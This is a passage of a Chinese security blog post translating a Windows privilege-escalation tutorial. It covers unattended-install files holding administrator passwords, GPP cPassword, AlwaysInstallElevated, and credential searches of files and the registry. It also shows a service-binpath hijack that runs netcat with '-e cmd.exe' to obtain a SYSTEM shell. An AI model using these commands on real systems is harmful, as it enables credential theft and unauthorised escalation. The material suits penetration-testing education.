class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"># This is a sample from sysprep.inf with clear-text credentials.</div><div class="line"></div><div class="line">[GuiUnattended]</div><div class="line">OEMSkipRegional=1</div><div class="line">OemSkipWelcome=1</div><div class="line">AdminPassword=s3cr3tp4ssw0rd</div><div class="line">TimeZone=20</div><div class="line"></div><div class="line"># This is a sample from sysprep.xml with Base64 &quot;encoded&quot; credentials. Please people Base64 is not</div><div class="line">encryption, I take more precautions to protect my coffee. The password here is &quot;SuperSecurePassword&quot;.</div><div class="line"></div><div class="line">&lt;LocalAccounts&gt;</div><div class="line">    &lt;LocalAccount wcm:action=&quot;add&quot;&gt;</div><div class="line">        &lt;Password&gt;</div><div class="line">            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</div><div class="line">            &lt;PlainText&gt;false&lt;/PlainText&gt;</div><div class="line">        &lt;/Password&gt;</div><div class="line">        &lt;Description&gt;Local Administrator&lt;/Description&gt;</div><div class="line">        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;</div><div class="line">        &lt;Group&gt;Administrators&lt;/Group&gt;</div><div class="line">        &lt;Name&gt;Administrator&lt;/Name&gt;</div><div class="line">    &lt;/LocalAccount&gt;</div><div class="line">&lt;/LocalAccounts&gt;</div><div class="line"></div><div class="line"># Sample from Unattended.xml with the same &quot;secure&quot; Base64 encoding.</div><div class="line"></div><div class="line">&lt;AutoLogon&gt;</div><div class="line">    &lt;Password&gt;</div><div class="line">        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</div><div class="line">        &lt;PlainText&gt;false&lt;/PlainText&gt;</div><div class="line">    &lt;/Password&gt;</div><div class="line">    &lt;Enabled&gt;true&lt;/Enabled&gt;</div><div class="line">    &lt;Username&gt;Administrator&lt;/Username&gt;</div><div class="line">&lt;/AutoLogon&gt;</div></pre></td></tr></table></figure>
+<h4 id="GPO-首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL-中的Groups-xml-文件，任何经过身份认证的用户都可以读取该文件。尽管xml-文件中的密码通过使用AES-加密来保证安全性，但是通过msdn-发布的静态密钥可以很轻松的解密。"><a href="#GPO-首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL-中的Groups-xml-文件，任何经过身份认证的用户都可以读取该文件。尽管xml-文件中的密码通过使用AES-加密来保证安全性，但是通过msdn-发布的静态密钥可以很轻松的解密。" class="headerlink" title="GPO 首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL 中的Groups.xml 文件，任何经过身份认证的用户都可以读取该文件。尽管xml 文件中的密码通过使用AES 加密来保证安全性，但是通过msdn 发布的静态密钥可以很轻松的解密。"></a>GPO 首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL 中的Groups.xml 文件，任何经过身份认证的用户都可以读取该文件。尽管xml 文件中的密码通过使用AES 加密来保证安全性，但是通过msdn 发布的静态密钥可以很轻松的解密。</h4><p><img src="http://www.fuzzysecurity.com/tutorials/images/priv05_big.png" alt=""></p>
+<h4 id="除了Groups-xml-以外，其他几个策略首选项文件也可能存在-“cPassword”-属性"><a href="#除了Groups-xml-以外，其他几个策略首选项文件也可能存在-“cPassword”-属性" class="headerlink" title="除了Groups.xml 以外，其他几个策略首选项文件也可能存在 “cPassword” 属性"></a>除了Groups.xml 以外，其他几个策略首选项文件也可能存在 “cPassword” 属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Services\Services.xml: Element-Specific Attributes</div><div class="line">ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element</div><div class="line">Printers\Printers.xml: SharedPrinter Element</div><div class="line">Drives\Drives.xml: Element-Specific Attributes</div><div class="line">DataSources\DataSources.xml: Element-Specific Attributes</div></pre></td></tr></table></figure>
+<h4 id="如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。"><a href="#如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。" class="headerlink" title="如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。"></a>如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。</h4><p><img src="http://www.fuzzysecurity.com/tutorials/images/priv06_big.png" alt=""></p>
+<h4 id="除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。"><a href="#除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。" class="headerlink" title="除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。"></a>除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">可以利用 msf 中的一个后渗透模块来实现自动化 [post/windows/gather/credentials/gpp](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)</div></pre></td></tr></table></figure>
+<h4 id="接下来我们要查找一个奇怪的注册表设置-“AlwaysInstallElevated”-如果启动此设置，它会允许任何用户将-msi-文件安装为NT-AUTHORITY-SYSTEM-。"><a href="#接下来我们要查找一个奇怪的注册表设置-“AlwaysInstallElevated”-如果启动此设置，它会允许任何用户将-msi-文件安装为NT-AUTHORITY-SYSTEM-。" class="headerlink" title="接下来我们要查找一个奇怪的注册表设置 “AlwaysInstallElevated” , 如果启动此设置，它会允许任何用户将 *.msi 文件安装为NT AUTHORITY \ SYSTEM 。"></a>接下来我们要查找一个奇怪的注册表设置 “AlwaysInstallElevated” , 如果启动此设置，它会允许任何用户将 *.msi 文件安装为NT AUTHORITY \ SYSTEM 。</h4><h4 id="为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出-SYSTEM-shell-通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7-并没有这两个键值。"><a href="#为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出-SYSTEM-shell-通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7-并没有这两个键值。" class="headerlink" title="为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出 SYSTEM shell. 通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7 并没有这两个键值。"></a>为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出 SYSTEM shell. 通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7 并没有这两个键值。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># This will only work if both registry keys contain &quot;AlwaysInstallElevated&quot; with DWORD values of 1.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div><div class="line">C:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div></pre></td></tr></table></figure>
+<h4 id="最后我们也可能通过下面的命令来挖到未知的宝藏"><a href="#最后我们也可能通过下面的命令来挖到未知的宝藏" class="headerlink" title="最后我们也可能通过下面的命令来挖到未知的宝藏"></a>最后我们也可能通过下面的命令来挖到未知的宝藏</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># The command below will search the file system for file names containing certain keywords. You can</div><div class="line">specify as many keywords as you wish.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; dir /s *pass* == *cred* == *vnc* == *.config*</div><div class="line"></div><div class="line"># Search certain file types for a keyword, this can generate a lot of output.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; findstr /si password *.xml *.ini *.txt</div><div class="line"></div><div class="line"># Similarly the two commands below can be used to grep the registry for keywords, in this case &quot;password&quot;.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; reg query HKLM /f password /t REG_SZ /s</div><div class="line">C:\Windows\system32&gt; reg query HKCU /f password /t REG_SZ /s</div></pre></td></tr></table></figure>
+<h2 id="Δt-for-t7-to-t10-Roll-Up-Your-Sleeves"><a href="#Δt-for-t7-to-t10-Roll-Up-Your-Sleeves" class="headerlink" title="Δt for t7 to t10 - Roll Up Your Sleeves"></a>Δt for t7 to t10 - Roll Up Your Sleeves</h2><h4 id="希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows-服务和文件-文件夹-权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows-XP-系统"><a href="#希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows-服务和文件-文件夹-权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows-XP-系统" class="headerlink" title="希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows 服务和文件/文件夹 权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows XP 系统"></a>希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows 服务和文件/文件夹 权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows XP 系统</h4><h4 id="接下来我们将利用一个Windows中大神级的工具集Sysinternals-Suite-中的accesschk-exe-来批量检查权限信息，读者可以从这里下载这个工具集"><a href="#接下来我们将利用一个Windows中大神级的工具集Sysinternals-Suite-中的accesschk-exe-来批量检查权限信息，读者可以从这里下载这个工具集" class="headerlink" title="接下来我们将利用一个Windows中大神级的工具集Sysinternals Suite 中的accesschk.exe 来批量检查权限信息，读者可以从这里下载这个工具集"></a>接下来我们将利用一个Windows中大神级的工具集Sysinternals Suite 中的accesschk.exe 来批量检查权限信息，读者可以从这里<a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="external">下载这个工具集</a></h4><h4 id="接下来我们从Windows-的服务开始，通过重新配置service-的参数能够让我们快速达到目的。"><a href="#接下来我们从Windows-的服务开始，通过重新配置service-的参数能够让我们快速达到目的。" class="headerlink" title="接下来我们从Windows 的服务开始，通过重新配置service 的参数能够让我们快速达到目的。"></a>接下来我们从Windows 的服务开始，通过重新配置service 的参数能够让我们快速达到目的。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># We can use sc to query, configure and manage windows services.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; sc qc Spooler</div><div class="line"></div><div class="line">[SC] QueryServiceConfig SUCCESS</div><div class="line"></div><div class="line">SERVICE_NAME: Spooler</div><div class="line">        TYPE               : 110  WIN32_OWN_PROCESS (interactive)</div><div class="line">        START_TYPE         : 2   AUTO_START</div><div class="line">        ERROR_CONTROL      : 1   NORMAL</div><div class="line">        BINARY_PATH_NAME   : C:\Windows\System32\spoolsv.exe</div><div class="line">        LOAD_ORDER_GROUP   : SpoolerGroup</div><div class="line">        TAG                : 0</div><div class="line">        DISPLAY_NAME       : Print Spooler</div><div class="line">        DEPENDENCIES       : RPCSS</div><div class="line">                           : http</div><div class="line">        SERVICE_START_NAME : LocalSystem</div></pre></td></tr></table></figure>
+<h4 id="我们也可以使用accesschk-来检查每个服务的权限级别"><a href="#我们也可以使用accesschk-来检查每个服务的权限级别" class="headerlink" title="我们也可以使用accesschk 来检查每个服务的权限级别"></a>我们也可以使用accesschk 来检查每个服务的权限级别</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"># We can see the permissions that each user level has, you can also use &quot;accesschk.exe -ucqv *&quot; to list</div><div class="line">all services.</div><div class="line"></div><div class="line">C:\&gt; accesschk.exe -ucqv Spooler</div><div class="line"></div><div class="line">Spooler</div><div class="line"></div><div class="line">  R  NT AUTHORITY\Authenticated Users</div><div class="line">        SERVICE_QUERY_STATUS</div><div class="line">        SERVICE_QUERY_CONFIG</div><div class="line">        SERVICE_INTERROGATE</div><div class="line">        SERVICE_ENUMERATE_DEPENDENTS</div><div class="line">        SERVICE_USER_DEFINED_CONTROL</div><div class="line">        READ_CONTROL</div><div class="line">  R  BUILTIN\Power Users</div><div class="line">        SERVICE_QUERY_STATUS</div><div class="line">        SERVICE_QUERY_CONFIG</div><div class="line">        SERVICE_INTERROGATE</div><div class="line">        SERVICE_ENUMERATE_DEPENDENTS</div><div class="line">        SERVICE_START</div><div class="line">        SERVICE_USER_DEFINED_CONTROL</div><div class="line">        READ_CONTROL</div><div class="line">  RW BUILTIN\Administrators</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\SYSTEM</div><div class="line">        SERVICE_ALL_ACCESS</div></pre></td></tr></table></figure>
+<h4 id="Accesschk-能够自动检查在某个用户等级下我们对于Windows-服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查-“Authenticated-Users”-。"><a href="#Accesschk-能够自动检查在某个用户等级下我们对于Windows-服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查-“Authenticated-Users”-。" class="headerlink" title="Accesschk 能够自动检查在某个用户等级下我们对于Windows 服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查 “Authenticated Users” 。"></a>Accesschk 能够自动检查在某个用户等级下我们对于Windows 服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查 “Authenticated Users” 。</h4><h4 id="咱们来比较一下在Windows-8-和-Windows-XP-SP0-中输出的不同"><a href="#咱们来比较一下在Windows-8-和-Windows-XP-SP0-中输出的不同" class="headerlink" title="咱们来比较一下在Windows 8 和 Windows XP SP0 中输出的不同,"></a>咱们来比较一下在Windows 8 和 Windows XP SP0 中输出的不同,</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"># This is on Windows 8.</div><div class="line"></div><div class="line">C:\Users\b33f\tools\Sysinternals&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</div><div class="line">No matching objects found.</div><div class="line"></div><div class="line"># On a default Windows XP SP0 we can see there is a pretty big security fail.</div><div class="line"></div><div class="line">C:\&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</div><div class="line">RW SSDPSRV</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">RW upnphost</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">		</div><div class="line">C:\&gt; accesschk.exe -ucqv SSDPSRV</div><div class="line"></div><div class="line">SSDPSRV</div><div class="line"></div><div class="line">  RW NT AUTHORITY\SYSTEM</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Administrators</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\Authenticated Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Power Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\LOCAL SERVICE</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line"></div><div class="line">C:\&gt; accesschk.exe -ucqv upnphost</div><div class="line"></div><div class="line">upnphost</div><div class="line"></div><div class="line">  RW NT AUTHORITY\SYSTEM</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Administrators</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\Authenticated Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Power Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\LOCAL SERVICE</div><div class="line">        SERVICE_ALL_ACCESS</div></pre></td></tr></table></figure>
+<h4 id="通过以上信息，我们能看到upnphost-具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹-system-shell"><a href="#通过以上信息，我们能看到upnphost-具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹-system-shell" class="headerlink" title="通过以上信息，我们能看到upnphost 具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹 system shell"></a>通过以上信息，我们能看到upnphost 具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹 system shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">C:\&gt; sc qc upnphost</div><div class="line"></div><div class="line">[SC] GetServiceConfig SUCCESS</div><div class="line"></div><div class="line">SERVICE_NAME: upnphost</div><div class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</div><div class="line">        START_TYPE         : 3   DEMAND_START</div><div class="line">        ERROR_CONTROL      : 1   NORMAL</div><div class="line">        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService</div><div class="line">        LOAD_ORDER_GROUP   :</div><div class="line">        TAG                : 0</div><div class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</div><div class="line">        DEPENDENCIES       : SSDPSRV</div><div class="line">        SERVICE_START_NAME : NT AUTHORITY\LocalService</div><div class="line">		</div><div class="line">C:\&gt; sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;</div><div class="line">[SC] ChangeServiceConfig SUCCESS</div><div class="line"></div><div class="line">C:\&gt; sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</div><div class="line">[SC] ChangeServiceConfig SUCCESS</div><div class="line"></div><div class="line">C:\&gt; sc qc upnphost</div><div class="line"></div><div class="line">[SC] GetServiceConfig SUCCESS</div><div class="line"></div><div class="line">SERVICE_NAME: upnphost</div><div class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</div><div class="line">        START_TYPE         : 3   DEMAND_START</div><div class="line">        ERROR_CONTROL      : 1   NORMAL</div><div class="line">        BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe</div><div class="line">        LOAD_ORDER_GROUP   :</div><div class="line">        TAG                : 0</div><div class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</div><div class="line">        DEPENDENCIES       : SSDPSRV</div><div class="line">        SERVICE_START_NAME : LocalSystem</div><div class="line">		</div><div class="line">C:\&gt; net start upnphost</div></pre></td></tr></table></figure>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410151231_nF2KHi_Screenshot.jpeg" alt=""></p>
+<h4 id="下图列出了关于Windows-提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM-shell"><a href="#下图列出了关于Windows-提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM-shell" class="headerlink" title="下图列出了关于Windows 提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM shell."></a>下图列出了关于Windows 提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM shell.</h4><p><img src="http://www.fuzzysecurity.com/tutorials/images/priv02_big.png" alt=""></p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><h4 id="以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥-hl0rey-的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！"><a href="#以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥-hl0rey-的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！" class="headerlink" title="以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥@hl0rey 的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！"></a>以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥@hl0rey 的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！</h4>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/04/13/Windows-提权基础（上）/">Windows 提权基础（上）</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
+        <p><span>发布时间:</span>2018-04-13, 17:13:10</p>
+        <p><span>最后更新:</span>2018-04-13, 17:14:31</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/04/13/Windows-提权基础（上）/" title="Windows 提权基础（上）">http://TimeS0ng.github.io/2018/04/13/Windows-提权基础（上）/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/04/13/Windows-提权基础（上）/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2018/04/13/Windows-提权基础（下）/">
+                    Windows 提权基础（下）
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/03/30/kali-代理之shadowsocks-proxychains/">
+                    kali 代理之shadowsocks &amp; proxychains
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#序言"><span class="toc-number">1.</span> <span class="toc-text">序言</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。"><span class="toc-number">1.0.1.</span> <span class="toc-text">本篇教程是笔者翻译国外大牛fuzzysecurity 的文章再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Indispensable-Resources"><span class="toc-number">1.0.2.</span> <span class="toc-text">Indispensable Resources:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Δt-for-t0-to-t3-Initial-Information-Gathering"><span class="toc-number">2.</span> <span class="toc-text">Δt for t0 to t3 - Initial Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#这个教程从Windows-的低权限shell-开始讲述如何提权。我们可能利用某个EXP-或者从客户端攻击取得了一个反弹shell-。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。"><span class="toc-number">2.0.1.</span> <span class="toc-text">这个教程从Windows 的低权限shell 开始讲述如何提权。我们可能利用某个EXP 或者从客户端攻击取得了一个反弹shell 。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！"><span class="toc-number">2.0.2.</span> <span class="toc-text">最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#首先查看连接的是什么操作系统："><span class="toc-number">2.0.3.</span> <span class="toc-text">首先查看连接的是什么操作系统：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#接下来查看主机名和当前shell-的用户名："><span class="toc-number">2.0.4.</span> <span class="toc-text">接下来查看主机名和当前shell 的用户名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1-不在localgroup-Administrators-中，不是管理员账号。"><span class="toc-number">2.0.5.</span> <span class="toc-text">现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1 不在localgroup Administrators 中，不是管理员账号。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。"><span class="toc-number">2.0.6.</span> <span class="toc-text">以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#首先我们查看可用的网卡和路由表"><span class="toc-number">2.0.7.</span> <span class="toc-text">首先我们查看可用的网卡和路由表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#下面使用netstat-命令查看主机的网络连接和防火墙规则"><span class="toc-number">2.0.8.</span> <span class="toc-text">下面使用netstat 命令查看主机的网络连接和防火墙规则</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动"><span class="toc-number">2.0.9.</span> <span class="toc-text">最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Δt-for-t4-The-Arcane-Arts-Of-WMIC"><span class="toc-number">3.</span> <span class="toc-text">Δt for t4 - The Arcane Arts Of WMIC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#我想要单独提及一下WMIC-Windows-Management-Instrumentation-Command-Line-，因为它是Windows最有用的命令行工具。WMIC-对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。"><span class="toc-number">3.0.1.</span> <span class="toc-text">我想要单独提及一下WMIC (Windows Management Instrumentation Command-Line) ，因为它是Windows最有用的命令行工具。WMIC 对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看："><span class="toc-number">3.0.2.</span> <span class="toc-text">下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC-的测试中我注意到任何版本的XP-系统都不允许低权限账号使用WMIC。相反，默认安装的Windows-7-Professional-和Windows-8-企业版却允许使用低权限账号使用WMIC-来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？"><span class="toc-number">3.0.3.</span> <span class="toc-text">令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC 的测试中我注意到任何版本的XP 系统都不允许低权限账号使用WMIC。相反，默认安装的Windows 7 Professional 和Windows 8 企业版却允许使用低权限账号使用WMIC 来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 